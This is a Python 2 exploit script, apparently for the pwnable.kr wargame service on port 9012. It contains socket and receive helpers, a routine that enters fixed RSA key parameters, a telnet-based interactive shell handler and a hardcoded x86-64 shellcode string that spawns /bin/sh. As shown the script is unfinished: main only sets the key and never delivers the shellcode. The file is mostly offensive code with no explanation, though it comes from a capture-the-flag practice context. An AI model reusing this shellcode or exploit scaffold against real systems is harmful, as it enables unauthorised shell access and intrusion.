#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
host = 'pwnable.kr'
host = '0'
s.connect((host, 9012))

shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def setkey():
    sendline('1')
    recvuntil('p : ')
    sendline('101')
    recvuntil('q : ')
    sendline('163')
    recvuntil('e : ')
    sendline('257')
    recvuntil('d : ')
    sendline('3593')
    recvuntil('> ')

def main():
    recvuntil('> ')
    setkey()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass

